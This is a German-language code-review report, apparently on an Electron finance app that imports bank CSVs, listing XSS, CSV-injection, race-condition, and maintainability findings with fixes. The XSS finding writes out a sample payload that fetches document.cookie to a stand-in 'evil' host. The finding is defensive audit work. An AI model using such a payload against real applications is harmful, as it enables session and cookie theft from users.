## 🔴 Kritische Findings

### 1. XSS in HTML-Export (`src/index.html:8080`)

```js
${data.transactions.map(t => `<tr><td>${t.date}</td><td>${t.description}</td>…`).join('')}
```

`t.description` stammt aus importierten CSVs — User-kontrolliert. Eine Beschreibung wie `<img src=x onerror=fetch('http://evil/'+document.cookie)>` wird **im geöffneten HTML-Report ausgeführt**. Gleiche Lücke an:

- Z. 8057 (`ct.category`)
- Z. 8062 (`q.name` — Quellen)
- Z. 8075 (`a.name` — Konten)
- Z. 8020 (`u.name`, `u.email`, `u.role`)
- Z. 8011 (`c.name` — Company Block)

**Fix:** in `buildHtmlReport` konsequent `esc()` auf **jeden** User-Content anwenden. Die Funktion existiert schon an Z. 8235.

### 2. CSV-Injection in Exports (Z. 7912, 8089–8091, main.js:797/802)

Beschreibungen beginnen unter Umständen mit `=`, `+`, `-`, `@` → Excel-Formelauswertung beim Öffnen. Ein manipulierter Import-Datensatz könnte beim Re-Export einen Formel-Trigger setzen.

**Fix:** In allen CSV-Export-Pfaden Zellen mit `=/+/−/@` führend prefixen mit `'` oder `"\t"`:

```js
function csvCell(s) {
  s = String(s ?? '');
  return /^[=+\-@]/.test(s) ? "'" + s : s;
}
```

### 3. UBS-Parser-Mismatch (bereits gefixt ✅)

Siehe Fix 1 in `main.js:740` — Header-Heuristik unterscheidet jetzt zwischen 22-Spalten-UBS und 4-Spalten-Export.

### 4. Keine Content-Security-Policy

`src/index.html` hat kein `<meta http-equiv="Content-Security-Policy">`. Bei 179 Inline-`onclick=`-Handlern + CDN-Scripts wären strikte Regeln komplex, aber eine Basis-Policy (`default-src 'self' https://cdn.tailwindcss.com …; script-src 'self' 'unsafe-inline' …`) würde Finding #1 entschärfen.

## 🟡 Correctness-Bugs (funktional, aber falsch)

### 5. Zu breite Self-Transfer-Heuristik (`main.js:480`, `main.js:538`)

```js
if (desc.includes('bertrag') || desc.includes('uebertrag'))
```

`bertrag` als Substring matcht auch `Kreditübertrag`, `Leasingübertrag`, ungewollte Namen. **Fix:** Wort-Grenze verwenden:

```js
if (/\b(übertrag|uebertrag)\b/i.test(desc))
```

### 6. `Lebensmittel`-Keywords fressen falsche Transaktionen (`main.js:38`)

- `Belastung LSV Migros Bank AG` → Lebensmittel (sollte Finanzen sein)
- `Migros Restaurant` → Lebensmittel (`Migros` matcht vor `Restaurant`), obwohl Restaurant explizit `Migros Restaurant` als Keyword hat.
- `Coop Rechtsschutz` → Lebensmittel

Die Order-Dependency in `autoCategorize` (Z. 200–211, first-match-wins) ist bekannt und dokumentiert (Z. 33–35, 38–39), aber instabil. **Empfehlung mittel­fristig:** Scoring statt first-match — Token-Match mit Längengewicht, oder mindestens Keywords innerhalb jeder Kategorie nach Länge absteigend sortieren (wie es für `extractQuelle` bereits gemacht wird, Z. 72–73).

### 7. Dead Keywords (`main.js:48, 50`)

`Moonshot`, `Zoho`, `Bitwarden`, `Anthropic`, `Coolors`, `PADDLE` stehen sowohl in `Wohnen` als auch in `Bildung`. First-match-wins → `Bildung`-Einträge sind tot. Eine von beiden entfernen.

### 8. Stale Kommentar in `Einnahmen` (`main.js:40–43`)

Der Kommentar „*'Verg' excluded to avoid forcing expense-typed transactions to income*" ist seit Fix 2 nicht mehr vollständig zutreffend — `Vergütung` steht jetzt in `Transfer`. Kommentar anpassen oder streichen.

### 9. `safeWrite` nicht atomar (`main.js:165–172`)

`fsp.writeFile` direkt aufs Ziel — bei Crash/Poweroff mitten im Schreiben ist die JSON-Datei **korrupt und leer**. Für eine Finanz-App heikel. **Fix:** Write-to-temp + rename-Pattern:

```js
const tmp = filePath + '.tmp';
await fsp.writeFile(tmp, JSON.stringify(data, null, 2));
await fsp.rename(tmp, filePath);
```

### 10. Race-Condition bei `updateTransaction` / `saveBankAccount` (`main.js:495–508, 570–596`)

Alle mutierenden IPC-Handler machen `read → modify → writeAll`. Bei gleichzeitigen Aufrufen (z. B. zwei schnellen Clicks) gewinnt der letzte Writer — der vorletzte Update geht verloren. Braucht eine Mutex/Queue wie bei `_importLock` (Z. 518).

### 11. `deleteBankAccount` nicht transaktional (`main.js:598–613`)

Löscht erst Account, schreibt dann Transaktionen. Wenn der zweite Write failed → orphan `bankAccountId` in Transaktionen. Try/catch mit Rollback oder Transaktions-Reihenfolge umdrehen.

### 12. CRLF-Inkonsistenz (`main.js:235 vs 353`)

Migros-Parser splittet an `\n`, Generic an `/\r?\n/`. Beide funktionieren, aber inkonsistent. **Fix:** überall `split(/\r?\n/)`.

### 13. Header-Erkennung zu strikt in Migros-Parser (`main.js:243`)

Wenn Migros irgendwann die Spalte `Buchungstext` in `Text` umbenennt, wird der Header nie gefunden und `headerFound` bleibt `false` — 0 Importe, kein Fehler, keine Warnung. Mindestens Logging + User-Fehlermeldung.

### 14. Import meldet Erfolg bei 0 Zeilen (`main.js:739, 742, 753`)

Wenn Filename `migros` enthält, aber das Format nicht passt → leeres Array, aber `success: true, count: 0`. User sieht keine Warnung.

## 🟢 Code-Qualität / Wartbarkeit

### 15. Monolithische `src/index.html` (8 259 Zeilen)

Nahezu alle Renderer-Logik in einem `<script>`-Block. Impact: IDE-Performance schlecht, Refactors riskant, keine Tree-Shaking-Möglichkeit, 179 Inline-`onclick`-Handler. Die `src-svelte/`-Migration adressiert das, ist aber nicht fertig. **Empfehlung:** entweder Migration priorisieren und Legacy einfrieren, oder die Svelte-Strecke streichen bis sie wirklich Priorität hat.

### 16. Keine Tests

0 Unit-Tests. Die Parser (`parseMigrosCSV`, `parseUBSCSV`, `parseGenericCSV`), `autoCategorize`, `reconcileType`, `extractQuelle`, `convertDate` sind pure Funktionen — ideal für Jest/Vitest. Gerade nach den letzten Fixes würde ein einfacher Test die Regression „UBS importiert 0 Zeilen" sofort fangen.

### 17. Lint: 1 Error + 1 Warning ungelöst

```
main.js:99:35   error    Unnecessary escape character: \/
main.js:128:14  warning  '_e' is defined but never used
```

CI führt Lint aus — das bedeutet CI ist rot oder ignoriert Fehler. Trivial zu fixen: `\/` → `/`, `(_e)` → `()`.

### 18. Duplizierte Build-Systeme

Sowohl `electron-builder` als auch `electron-packager` in devDependencies. Zwei Build-Scripts (`build`, `build:legacy`). Nur eines auswählen, das andere entfernen.

### 19. `package.json → files: ["node_modules/**/*"]`

Bläht das portable `.exe` enorm auf. `electron-builder` inkludiert Runtime-Deps automatisch nach `package.json → dependencies` — der Override ist meistens falsch und kopiert auch `devDependencies` mit.

### 20. Tote/unklare Dateien

- `src/index-original.html` (uncommitted): Altbackup → löschen.
- `Zentr-Finance/` Unterordner mit zwei Markdowns: nicht referenziert.
- `REDESIGN_SUMMARY.md` (uncommitted): entweder committen oder löschen.
- `AGENTS.md` vs `CLAUDE.md`: potentielle Divergenz. Eines als kanonisch erklären.

### 21. Role-System ist UI-Only (aus CLAUDE.md bekannt)

`main.js` erzwingt keine Rollen-Prüfung in IPC-Handlern — DevTools (Ctrl+Shift+I, in Prod aktivierbar) umgeht alle Beschränkungen. Für Single-User-Desktop OK, aber nie als „Authentication" bezeichnen.

### 22. Keine i18n

Strings hart deutsch/englisch gemischt (UI-Labels oft EN, Kategorien DE). Für Schweizer/deutsche Zielgruppe OK, aber konsistent machen.

### 23. Chart.js-Instanzen — tight coupling

Charts werden korrekt per `.destroy()` vor Neu-Erstellung aufgeräumt, aber 8 Chart-Globals (`_monthlyChart`, `_catChart`, `_trendChart`, `_anTrendChart`, …) als Module-Level-State sind ein Warnzeichen. In der Svelte-Migration durch Component-scoped State ersetzen.

## Vergleich UBS vs. Migros Parser — jetziger Stand nach Fix

| Aspekt | `parseUBSCSV` | `parseMigrosCSV` | `parseGenericCSV` |
|---|---|---|---|
| BOM-Strip | ✅ | ❌ | ❌ |
| Header-Erkennung | Skip Line 0 | Tokens `Datum`+`Buchungstext`+`Betrag` | idem oder Line 0 |
| Column-Adressierung | Index 10/12/18/19 | Index 0/1/2 | Index 0/1/2 |
| Debit/Credit-Spalten | getrennt | Vorzeichen | Vorzeichen |
| CRLF-Behandlung | `split('\n')` + trim | `split('\n')` | `/\r?\n/` ✅ |
| `cleanDescription` | `cleanUBSDescription` (aggressiv) | `cleanDescription` | `cleanDescription` |
| Encoding | UTF-8 hardcoded | UTF-8 hardcoded (aber Migros-Exports oft Win-1252!) | UTF-8 hardcoded |

**Konsistenz-Fix (mittelgroßer Impact):** drei Parser zu einer Basis zusammenführen, die `{ dateCol, descCol, amountCol, debitCol, creditCol }` als Spalten-Map bekommt. Header-Name → Index-Mapping. Dann werden Bugs #12, #13 und die BOM-/Encoding-Frage in einem Schlag gelöst.
